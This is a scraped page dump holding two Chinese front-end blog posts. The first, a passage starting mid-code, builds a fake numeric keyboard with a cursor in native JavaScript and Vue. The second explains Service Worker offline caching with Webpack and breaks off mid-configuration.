class=\"hljs-keyword\">if</span> (document.selection) {\n  // IE Support\n  textDom.focus ();\n  var selectRange = document.selection.createRange();\n  selectRange.moveStart (<span class=\"hljs-string\">'character'</span>, -textDom.value.length);\n  cursorPos = selectRange.text.length;\n }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (textDom.selectionStart || textDom.selectionStart == <span class=\"hljs-string\">'0'</span>) {\n  // Firefox support\n  cursorPos = textDom.selectionStart;\n }\n <span class=\"hljs-built_in\">return</span> cursorPos;\n}\n</code></pre><p>由于我们的是移动端H5开发项目，考虑兼容性，显然以上方法不能兼容大部分的机型。</p>\n<h3 class=\"heading\" data-id=\"heading-4\">3. 输入框、光标、数字键盘全假实现方案</h3>\n<p>以上两种方案均难以实现，因此我只能大胆想象，要实现满足以上需求的假键盘就得实现假输入框、假光标、假keyboard的一套装备。这样所有的元素我都能控制，上面的那些问题全部可以解决。</p>\n<p>雏形若是实现只能从最后面增加删除没有光标的假键盘非常容易，只需要给每个键绑定一个click事件，维护一个数组，每次从后面push或者pop就能维护输入框中的内容。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cfd5895f4abe?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"291\" data-height=\"522\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;291&quot; height=&quot;522&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code> 图3 只能从最后添加、删除且没有光标的效果图\n</code></pre>\n<p>但是这样跟正真的输入框效果比体验太差了。</p>\n<p><strong>难点</strong></p>\n<p>要实现体验跟原生键盘一样并且自带输入验证的假键盘，难点主要在于：</p>\n<ul>\n<li>有光标，且光标闪动</li>\n<li>光标定位，点击数字中间光标自动移过去</li>\n<li>根据光标的位置实现插入删除</li>\n<li>失去焦点光标隐藏，点击输入框光标显示并且弹出键盘</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-5\">原生js实现</h2>\n<p>对于光标实现，创造一个元素设置背景色，可以控制它隐藏和出现。</p>\n<p>对于“点击数字中间光标自动移过去 ”，可以每添加一个数字或者小数点就先加一个带点击事件的空元素space，再添加要输入的字符。space是为了绑定一个点击事件，告诉光标要移动到的位置。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">//字符插入，在光标前插入字符\n<span class=\"hljs-keyword\">function</span> insert(value) {\n\tvar span = document.createElement(<span class=\"hljs-string\">\"span\"</span>); //创建包含值的元素\n\tspan.className = <span class=\"hljs-string\">'val'</span>;\n\tspan.innerText = value;\n\n\tvar space = document.createElement(<span class=\"hljs-string\">\"span\"</span>);\n\tspace.className = <span class=\"hljs-string\">'space'</span>;\n\tspace.addEventListener(<span class=\"hljs-string\">'click'</span>, moveCursor);\n\n\tvar cursor = document.getElementsByClassName(<span class=\"hljs-string\">'cursor'</span>)[0];\n\n\tinputArea.insertBefore(space, cursor);//插入空列\n\tinputArea.insertBefore(span, cursor);//插入值\n}\n</code></pre><p>删除时也是先删除光标之前的数字字符，再删除space元素。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">//删除元素\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">deleteElement</span></span>() {\n\t<span class=\"hljs-built_in\">set</span>CursorFlash();\n\tvar cursor = document.getElementsByClassName(<span class=\"hljs-string\">'cursor'</span>)[0];\n\tvar n = 2; //两个删除动作\n \t<span class=\"hljs-keyword\">while</span>(cursor.previousSibling &amp;&amp; n &gt; 0) {\n    inputArea.removeChild(cursor.previousSibling );\n    n--;\n \t}\n\t<span class=\"hljs-keyword\">if</span>(getInputStr().search(/^\\.\\d*/) &gt; -1) {\n\t\tinsert(0);\n\t}\n\t<span class=\"hljs-keyword\">if</span>(getInputStr() === <span class=\"hljs-string\">''</span>){ //元素为空placeholder显示\n\t\tvar placeHolder = document.getElementsByClassName(<span class=\"hljs-string\">'holder'</span>)[0];\n\t\tplaceHolder.className = <span class=\"hljs-string\">'holder'</span>;\n\t}\n}\n</code></pre><p>通过chrome里面元素审查可以看到添加删除的过程。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb490ca50f8d?imageslim\" data-width=\"511\" data-height=\"389\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;511&quot; height=&quot;389&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code>图4 添加、删除、光标移动元素变化图\n</code></pre>\n<p>每一个space元素都绑定一个click事件，用来移动光标，最右边有个right-space可以用来放placeholder,也可以添加click事件，点击时光标总是移到最后一位。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">//移动光标位置\n<span class=\"hljs-keyword\">function</span> moveCursor(event) {\n\tvar cursor = document.getElementsByClassName(<span class=\"hljs-string\">'cursor'</span>)[0];//获取光标\n\t<span class=\"hljs-keyword\">if</span>(event.currentTarget.className == <span class=\"hljs-string\">'right-space'</span>){\n\t\t<span class=\"hljs-keyword\">if</span>(!cursor.nextSibling || cursor.nextSibling.nodeName == <span class=\"hljs-string\">'#text'</span>){\n\t\t\t<span class=\"hljs-built_in\">return</span>;\n\t\t} <span class=\"hljs-keyword\">else</span> {\n\t\t\tvar ele = cursor.nextSibling;\n\t\t\tinputArea.insertBefore(inputArea.lastElementChild, ele);\n\t\t\tinputArea.appendChild(cursor);\n\t\t}\n\t}<span class=\"hljs-keyword\">else</span> {\n\t\tvar tempEle = event.currentTarget.nextSibling;\n\t\t// var nodeName = event.currentTarget.nextSibling.nodeName;\n\t\t// var cursor = document.getElementsByClassName(<span class=\"hljs-string\">'cursor'</span>)[0];\n\t\t<span class=\"hljs-keyword\">if</span>(!tempEle || tempEle.nodeName == <span class=\"hljs-string\">'#text'</span>) {\n\t\t\tvar temp = event.currentTarget.previousSibling;\n\t\t\tvar ele = inputArea.replaceChild( event.currentTarget, cursor);//把光标替换成当前元素\n\t\t\tinputArea.appendChild(ele);\n\t\t} <span class=\"hljs-keyword\">else</span> {\n\t\t\tvar temp = event.currentTarget.nextSibling;\n\t\t\tvar ele = inputArea.replaceChild( event.currentTarget, cursor);//把光标替换成当前元素\n\t\t\tinputArea.insertBefore(ele, temp);\n\t\t}\n\t}\n}\n</code></pre><p>从上面的GIF图可以看出，光标始终只有一个而且有个定时任务。光标的闪动设置如下，使用原生的setInterval实现。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">//设置光标定时任务\n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">setCursorFlash</span></span>() {\n\t//placeholder 隐藏\n\tvar placeHolder = document.getElementsByClassName(<span class=\"hljs-string\">'holder'</span>)[0];\n\tplaceHolder.className = <span class=\"hljs-string\">'holder hidden'</span>;\n\n\tvar cursor = document.getElementsByClassName(<span class=\"hljs-string\">'cursor'</span>)[0];\n\tvar inputContainer = document.getElementsByClassName(<span class=\"hljs-string\">'input-container'</span>)[0];\n\tcursor.className = <span class=\"hljs-string\">\"cursor\"</span>;\n\tvar isShowCursor = <span class=\"hljs-literal\">true</span>;\n\tinputContainer.focus();\n\tshowKeyBoard();\n\t<span class=\"hljs-keyword\">if</span> (intervalId) {\n\t\tclearInterval(intervalId);\n\t}\n\tintervalId = <span class=\"hljs-built_in\">set</span>Interval(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>() {\n\t\tisShowCursor = !isShowCursor;\n\t\t<span class=\"hljs-keyword\">if</span> (isShowCursor) {\n\t\t\tcursor.className = <span class=\"hljs-string\">'cursor'</span>;\n\t\t} <span class=\"hljs-keyword\">else</span> {\n\t\t\tcursor.className = <span class=\"hljs-string\">'cursor hidden'</span>;\n\t\t}\n\t}, 1000);\n}\n</code></pre><p>最终使用原生js实现的带输入框、光标，keyboard的假数字键盘。</p>\n<p>除了完成以上功能，还实现了输入前验证功能，为了跟接近真实输入框表现，同时实现了点击</p>\n<p>输入框获取焦点、光标闪动、弹出键盘；失去焦点光标消失。</p>\n<p><strong>为什么不使用jQuery？</strong></p>\n<p>一是因为，当前的H5项目没有使用jQuery。</p>\n<p>二是因为使用VUE之后很少需要直接操作DOM，少数方法自己实现更轻量，若是只为了使用</p>\n<p>其一两个方法而引入jQuery，会使得项目更重。</p>\n<p><strong>原生js实现效果</strong></p>\n<p>图5 原生js实现输入框、光标、键盘全假套件效果图\n源码<a target=\"_blank\">github.com/DaisyWang88…</a></p>\n<p>手机扫码验证：\n<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fsandbox.runjs.cn%2Fshow%2Fmvjrcagy\" rel=\"nofollow noopener noreferrer\">sandbox.runjs.cn/show/mvjrca…</a>(chrome插件url二维码生成器GetCrx.cn)</p>\n<p>由于移动端click事件有300毫秒延时，因此原生js实现的效果，有点不是很流畅。若使用原生JS实现版的需要使fastclick或zepto的tap事件解决延时问题。</p>\n<p>PS：之前说‘VUE本身解决300毫秒延时问题’，考证之后发现不对，给大家带来困扰实在抱歉。</p>\n<p>考证之后发现VUE的click事件都是原生的click并没有处理这个延时。为了不让大家困扰，github上的demo已经使用fastClick解决了延时问题，（之前太懒了&gt;.&lt;）。现在原生的js实现效果也很顺畅了。</p>\n<h2 class=\"heading\" data-id=\"heading-6\">VUE组件化</h2>\n<p>考虑到项目里有的应用场景有多个输入框，当然输入的时候只需要一个键盘，因此组件化的时候将输入框作为一个组件v-input，键盘作为一个组件v-keyboard。</p>\n<h3 class=\"heading\" data-id=\"heading-7\">输入框和键盘的交互</h3>\n<p>交互图如下：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cbd97c7d670f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"597\" data-height=\"425\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;597&quot; height=&quot;425&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<pre><code> 图6 VUE组件交互图\n</code></pre>\n<p>考虑到本项目里面存在一个页面多个输入框的场景，因此需要控制键盘与哪个输入框配合使用。</p>\n<p>为了达到这样的目的，采用“当点击输入框获取焦点的时候，将当前v-input输入框组件的实例传给v-keyboard键盘组件”的方式。</p>\n<p><code>this.$refs.virtualKeyBoard.$emit('getInputVm', this.$refs.virtualInput);</code>\n如图6 ，v-keyboard组件会监听'getInputVm'事件，获取v-input的实例。</p>\n<p>键盘组件v-keyboard获取到输入框组件v-input的实例之后就可以根据键盘的点击事件——添加或删除，操作输入框组件v-input来放入或者删除字符了。</p>\n<p>这样即使有多个输入框，也方便控制键盘和输入框之间的操作。</p>\n<h3 class=\"heading\" data-id=\"heading-8\">输入框自动获取焦点，键盘自动弹出</h3>\n<p>需求里要求进入某个页面输入框自动获取焦点，键盘自动弹出。</p>\n<ul>\n<li>输入框自动获取焦点可以通过设置is-auto-focus来控制是否自动获取焦点。</li>\n</ul>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;v-input\n    ref=<span class=\"hljs-string\">\"virtualInput\"</span>\n    v-model=<span class=\"hljs-string\">\"amount\"</span>\n    :placeholder=<span class=\"hljs-string\">\"placeText\"</span>\n    :is-auto-focus=<span class=\"hljs-string\">\"true\"</span>\n    @show-key-board=<span class=\"hljs-string\">\"showKeyBoard\"</span>&gt;\n&lt;/v-input&gt;\n</code></pre><ul>\n<li>要自动弹出键盘如图6，需要在页面实例化完成之后将相应的输入框组件v-input的实例传给键盘组件v-keyboard。</li>\n</ul>\n<pre><code class=\"hljs bash\" lang=\"bash\">this.<span class=\"hljs-variable\">$refs</span>.virtualKeyBoard.<span class=\"hljs-variable\">$emit</span>(<span class=\"hljs-string\">'getInputVm'</span>, this.<span class=\"hljs-variable\">$refs</span>.virtualInput);\n</code></pre><p>键盘组间捕获'getInputVm'事件之后获取了相应输入框的实例，同时自动弹出。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">this.<span class=\"hljs-variable\">$on</span>(<span class=\"hljs-string\">'getInputVm'</span>, <span class=\"hljs-keyword\">function</span>(obj) {\n     this.refObject = obj;\n     this.isShow = <span class=\"hljs-literal\">true</span>;\n});\n</code></pre><h3 class=\"heading\" data-id=\"heading-9\">v-model支持</h3>\n<p>vue支持自定义v-model，子组件设置一个value 的 props。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">props: {\n    value: {\n      <span class=\"hljs-built_in\">type</span>: String,\n      default: <span class=\"hljs-string\">''</span>,\n    },\n}\n</code></pre><p>在value改变的时候$emit一个'input'事件并把相应的值传出去就可以实现v-model的双向绑定了。this.getInputStr()是用来获取输入框中字符串的函数。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">this.<span class=\"hljs-variable\">$emit</span>(<span class=\"hljs-string\">'input'</span>, this.getInputStr());\n</code></pre><p>效果如下：</p>\n<p>源码参见<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FDaisyWang88%2FVUE-keyboard\" rel=\"nofollow noopener noreferrer\">github.com/DaisyWang88…</a>。</p>\n<h2 class=\"heading\" data-id=\"heading-10\">总结</h2>\n<p>原生的input 设置type =number，想要做输入前验证控制小数点个数和小数位数等功能基本很难实现，要在输入前取到值也是存在各种兼容性问题，目前只有ontextInput在移动端能在输入前准确取到值，还有个关键的问题type =number的时候取到的value不包含小数点，导致输入前使用正则验证几乎无法实现；若是设置type= text 虽然能取到输入框中所有字符，但是就无法弹出数字键盘。要想使用原生input输入小数，就必须有所取舍。</p>\n<ul>\n<li>要么不做输入前验证，使用type = number ，可以输入多个小数点，只在数值数值不合法的时候提示输入不合法，但是只有android可以弹出数字键盘，IOS仍然弹出全键盘。用户体验可能差些。</li>\n<li>要么使用type = text，虽然可以做到输入前验证（因为可以取到全部字符），但是所有机型都只会弹全键盘了，用户体验也一般。</li>\n<li>以上两种都无法实现进入页面键盘自动弹出，只能借助NA提供的方法实现。</li>\n<li>如果你是强迫症癌晚期患者，用户体验之上者，那么你就可以跟我一样做个假键盘，这样以上问题都不是问题。还可以添加附加功能，比如输入的时候若在第一位输入小数点的时候，前面自动补'0'；删除的时候，若小数点在第一位前面自动补'0'；还可以定制光标颜色、键盘样式等等。</li>\n</ul>\n<p>很不幸，我就是一个强迫症癌晚期患者，目前实现的键盘套件改造成VUE组件已经成功在项目中使用，有单输入框的页面，也有多输入框的页面，支持placeholder 和v-model。</p>\n</div>"},null,null,{"title":"Webpack实战-构建离线应用","avatar":"https://dn-mhke0kuv.qbox.me/Ql6BAtKbPPCQ2MCl74XLOMA?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"浩麟","create_time":"2017 年 12 月 23 日","tags":["Webpack","前端","Chrome","浏览器"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">认识离线应用</h2>\n<p>你的网页性能优化的再好，如果网络不好那也会导致网页的体验差。\n离线应用是指通过离线缓存技术，让资源在第一次被加载后缓存在本地，下次访问它时就直接返回本地的文件，就算没有网络连接。</p>\n<p>离线应用有以下优点：</p>\n<ul>\n<li>在没有网络的情况下也能打开网页。</li>\n<li>由于部分被缓存的资源直接从本地加载，对用户来说可以加速网页加载速度，对网站运营者来说可以减少服务器压力以及传输流量费用。</li>\n</ul>\n<p>离线应用的核心是离线缓存技术，历史上曾先后出现2种离线离线缓存技术，它们分别是：</p>\n<ol>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTML%2FUsing_the_application_cache\" rel=\"nofollow noopener noreferrer\">AppCache</a> 又叫 Application Cache，目前已经从 Web 标准中删除，请尽量不要使用它。</li>\n<li><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FService_Worker_API%2FUsing_Service_Workers\" rel=\"nofollow noopener noreferrer\">Service Workers</a> 是目前最新的离线缓存技术，是 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fjavascript.ruanyifeng.com%2Fhtmlapi%2Fwebworker.html\" rel=\"nofollow noopener noreferrer\">Web Worker</a> 的一部分。\n它通过拦截网络请求实现离线缓存，比 AppCache 更加灵活。它也是构建 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2FApps%2FProgressive\" rel=\"nofollow noopener noreferrer\">PWA</a> 应用的关键技术之一。</li>\n</ol>\n<p>Service Workers 相比于 AppCache 来说更加灵活，因为它可以通过 JavaScript 代码去控制缓存的逻辑。\n由于第1种技术已经废弃，本节只专注于讲解如何用 Webpack 构建使用了 Service Workers 的网页。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">认识 Service Workers</h2>\n<p>Service Workers 是一个在浏览器后台运行的脚本，它生命周期完全独立于网页。它无法直接访问 DOM，但可以通过 postMessage 接口发送消息来和 UI 进程通信。\n拦截网络请求是 Service Workers 的一个重要功能，通过它能完成离线缓存、编辑响应、过滤响应等功能。</p>\n<p>想更深入的了解 Service Workers，推荐阅读文章<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fweb%2Ffundamentals%2Fgetting-started%2Fprimers%2Fservice-workers%3Fhl%3Dzh-cn\" rel=\"nofollow noopener noreferrer\">服务工作线程：简介</a>。</p>\n<h3 class=\"heading\" data-id=\"heading-2\">Service Workers 兼容性</h3>\n<p>目前 Chrome、Firefox、Opera 都已经全面支持 Service Workers，但对于移动端浏览器就不太乐观了，只有高版本的 Android 支持。\n由于 Service Workers 无法通过注入 polyfill 去实现兼容，所以在你打算使用它前请先调查清楚你的网页的运行场景。</p>\n<p>判断浏览器是否支持 Service Workers 的最简单的方法是通过以下代码：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 如果 navigator 对象上存在 serviceWorker 对象，就表示支持</span>\n<span class=\"hljs-keyword\">if</span> (navigator.serviceWorker) {\n  <span class=\"hljs-comment\">// 通过 navigator.serviceWorker 使用</span>\n}\n</code></pre><h3 class=\"heading\" data-id=\"heading-3\">注册 Service Workers</h3>\n<p>要给网页接入 Service Workers，需要在网页加载后注册一个描述 Service Workers 逻辑的脚本。\n代码如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">if</span> (navigator.serviceWorker) {\n  <span class=\"hljs-built_in\">window</span>.addEventListener(<span class=\"hljs-string\">'DOMContentLoaded'</span>,<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{\n    <span class=\"hljs-comment\">// 调用 serviceWorker.register 注册，参数 /sw.js 为脚本文件所在的 URL 路径</span>\n      navigator.serviceWorker.register(<span class=\"hljs-string\">'/sw.js'</span>);\n  });\n}\n</code></pre><p>一旦这个脚本文件被加载，Service Workers 的安装就开始了。这个脚本被安装到浏览器中后，就算用户关闭了当前网页，它仍会存在。\n也就是说第一次打开该网页时 Service Workers 的逻辑不会生效，因为脚本还没有被加载和注册，但是以后再次打开该网页时脚本里的逻辑将会生效。</p>\n<p>在 Chrome 中可以通过打开网址 <code>chrome://inspect/#service-workers</code> 来查看当前浏览器中所有注册了的 Service Workers。</p>\n<h3 class=\"heading\" data-id=\"heading-4\">使用 Service Workers 实现离线缓存</h3>\n<p>Service Workers 在注册成功后会在其生命周期中派发出一些事件，通过监听对应的事件在特点的时间节点上做一些事情。</p>\n<p>在 Service Workers 脚本中，引入了新的关键字 <code>self</code> 代表当前的 Service Workers 实例。</p>\n<p>在 Service Workers 安装成功后会派发出 <code>install</code> 事件，需要在这个事件中执行缓存资源的逻辑，实现代码如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 当前缓存版本的唯一标识符，用当前时间代替</span>\n<span class=\"hljs-keyword\">var</span> cacheKey = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>().toISOString();\n\n<span class=\"hljs-comment\">// 需要被缓存的文件的 URL 列表</span>\n<span class=\"hljs-keyword\">var</span> cacheFileList = [\n  <span class=\"hljs-string\">'/index.html'</span>,\n  <span class=\"hljs-string\">'/app.js'</span>,\n  <span class=\"hljs-string\">'/app.css'</span>\n];\n\n<span class=\"hljs-comment\">// 监听 install 事件</span>\nself.addEventListener(<span class=\"hljs-string\">'install'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">event</span>) </span>{\n  <span class=\"hljs-comment\">// 等待所有资源缓存完成时，才可以进行下一步</span>\n  event.waitUntil(\n    caches.open(cacheKey).then(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">cache</span>) </span>{\n      <span class=\"hljs-comment\">// 要缓存的文件 URL 列表</span>\n      <span class=\"hljs-keyword\">return</span> cache.addAll(cacheFileList);\n    })\n  );\n});\n</code></pre><p>接下来需要监听网络请求事件去拦截请求，复用缓存，代码如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\">self.addEventListener(<span class=\"hljs-string\">'fetch'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">event</span>) </span>{\n  event.respondWith(\n    <span class=\"hljs-comment\">// 去缓存中查询对应的请求</span>\n    caches.match(event.request).then(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>) </span>{\n        <span class=\"hljs-comment\">// 如果命中本地缓存，就直接返回本地的资源</span>\n        <span class=\"hljs-keyword\">if</span> (response) {\n          <span class=\"hljs-keyword\">return</span> response;\n        }\n        <span class=\"hljs-comment\">// 否则就去用 fetch 下载资源</span>\n        <span class=\"hljs-keyword\">return</span> fetch(event.request);\n      }\n    )\n  );\n});\n</code></pre><p>以上就实现了离线缓存。</p>\n<h3 class=\"heading\" data-id=\"heading-5\">更新缓存</h3>\n<p>线上的代码有时需要更新和重新发布，如果这个文件被离线缓存了，那就需要 Service Workers 脚本中有对应的逻辑去更新缓存。\n这可以通过更新 Service Workers 脚本文件做到。</p>\n<p>浏览器针对 Service Workers 有如下机制：</p>\n<ol>\n<li>每次打开接入了 Service Workers 的网页时，浏览器都会去重新下载 Service Workers 脚本文件（所以要注意该脚本文件不能太大），如果发现和当前已经注册过的文件存在字节差异，就将其视为“新服务工作线程”。</li>\n<li>新 Service Workers 线程将会启动，且将会触发其 install 事件。</li>\n<li>当网站上当前打开的页面关闭时，旧 Service Workers 线程将会被终止，新 Service Workers 线程将会取得控制权。</li>\n<li>新 Service Workers 线程取得控制权后，将会触发其 activate 事件。</li>\n</ol>\n<p>新 Service Workers 线程中的 activate 事件就是最佳的清理旧缓存的时间点，代码如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 当前缓存白名单，在新脚本的 install 事件里将使用白名单里的 key </span>\n<span class=\"hljs-keyword\">var</span> cacheWhitelist = [cacheKey];\n\nself.addEventListener(<span class=\"hljs-string\">'activate'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">event</span>) </span>{\n  event.waitUntil(\n    caches.keys().then(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">cacheNames</span>) </span>{\n      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Promise</span>.all(\n        cacheNames.map(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">cacheName</span>) </span>{\n          <span class=\"hljs-comment\">// 不在白名单的缓存全部清理掉</span>\n          <span class=\"hljs-keyword\">if</span> (cacheWhitelist.indexOf(cacheName) === <span class=\"hljs-number\">-1</span>) {\n            <span class=\"hljs-comment\">// 删除缓存</span>\n            <span class=\"hljs-keyword\">return</span> caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});\n</code></pre><p>最终完整的代码 Service Workers 脚本代码如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 当前缓存版本的唯一标识符，用当前时间代替</span>\n<span class=\"hljs-keyword\">var</span> cacheKey = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>().toISOString();\n\n<span class=\"hljs-comment\">// 当前缓存白名单，在新脚本的 install 事件里将使用白名单里的 key</span>\n<span class=\"hljs-keyword\">var</span> cacheWhitelist = [cacheKey];\n\n<span class=\"hljs-comment\">// 需要被缓存的文件的 URL 列表</span>\n<span class=\"hljs-keyword\">var</span> cacheFileList = [\n  <span class=\"hljs-string\">'/index.html'</span>,\n  <span class=\"hljs-string\">'app.js'</span>,\n  <span class=\"hljs-string\">'app.css'</span>\n];\n\n<span class=\"hljs-comment\">// 监听 install 事件</span>\nself.addEventListener(<span class=\"hljs-string\">'install'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">event</span>) </span>{\n  <span class=\"hljs-comment\">// 等待所有资源缓存完成时，才可以进行下一步</span>\n  event.waitUntil(\n    caches.open(cacheKey).then(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">cache</span>) </span>{\n      <span class=\"hljs-comment\">// 要缓存的文件 URL 列表</span>\n      <span class=\"hljs-keyword\">return</span> cache.addAll(cacheFileList);\n    })\n  );\n});\n\n<span class=\"hljs-comment\">// 拦截网络请求</span>\nself.addEventListener(<span class=\"hljs-string\">'fetch'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">event</span>) </span>{\n  event.respondWith(\n    <span class=\"hljs-comment\">// 去缓存中查询对应的请求</span>\n    caches.match(event.request).then(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">response</span>) </span>{\n        <span class=\"hljs-comment\">// 如果命中本地缓存，就直接返回本地的资源</span>\n        <span class=\"hljs-keyword\">if</span> (response) {\n          <span class=\"hljs-keyword\">return</span> response;\n        }\n        <span class=\"hljs-comment\">// 否则就去用 fetch 下载资源</span>\n        <span class=\"hljs-keyword\">return</span> fetch(event.request);\n      }\n    )\n  );\n});\n\n<span class=\"hljs-comment\">// 新 Service Workers 线程取得控制权后，将会触发其 activate 事件</span>\nself.addEventListener(<span class=\"hljs-string\">'activate'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">event</span>) </span>{\n  event.waitUntil(\n    caches.keys().then(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">cacheNames</span>) </span>{\n      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Promise</span>.all(\n        cacheNames.map(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">cacheName</span>) </span>{\n          <span class=\"hljs-comment\">// 不在白名单的缓存全部清理掉</span>\n          <span class=\"hljs-keyword\">if</span> (cacheWhitelist.indexOf(cacheName) === <span class=\"hljs-number\">-1</span>) {\n            <span class=\"hljs-comment\">// 删除缓存</span>\n            <span class=\"hljs-keyword\">return</span> caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});\n</code></pre><h2 class=\"heading\" data-id=\"heading-6\">接入 Webpack</h2>\n<p>用 Webpack 构建接入 Service Workers 的离线应用要解决的关键问题在于如何生成上面提到的 <code>sw.js</code> 文件，\n并且<code>sw.js</code>文件中的 <code>cacheFileList</code> 变量，代表需要被缓存文件的 URL 列表，需要根据输出文件列表所对应的 URL 来决定，而不是像上面那样写成静态值。</p>\n<p>假如构建输出的文件目录结构为：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">├── app_4c3e186f.js\n├── app_7cc98ad0.css\n└── index.html\n</code></pre><p>那么 <code>sw.js</code> 文件中 <code>cacheFileList</code> 的值应该是：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">var</span> cacheFileList = [\n  <span class=\"hljs-string\">'/index.html'</span>,\n  <span class=\"hljs-string\">'app_4c3e186f.js'</span>,\n  <span class=\"hljs-string\">'app_7cc98ad0.css'</span>\n];\n</code></pre><p>Webpack 没有原生功能能完成以上要求，幸好庞大的社区中已经有人为我们做好了一个插件 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Foliviertassinari%2Fserviceworker-webpack-plugin\" rel=\"nofollow noopener noreferrer\">serviceworker-webpack-plugin</a> 可以方便的解决以上问题。\n使用该插件后的 Webpack 配置如下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> path = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'path'</span>);\n<span class=\"hljs-keyword\">const</span> ExtractTextPlugin = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'extract-text-webpack-plugin'</span>);\n<span class=\"hljs-keyword\">const</span> { WebPlugin } = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'web-webpack-plugin'</span>);\n<span class=\"hljs-keyword\">const</span> ServiceWorkerWebpackPlugin = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'serviceworker-webpack-plugin'</span>);\n\n<span class=\"hljs-built_in\">module</span>.exports = {\n  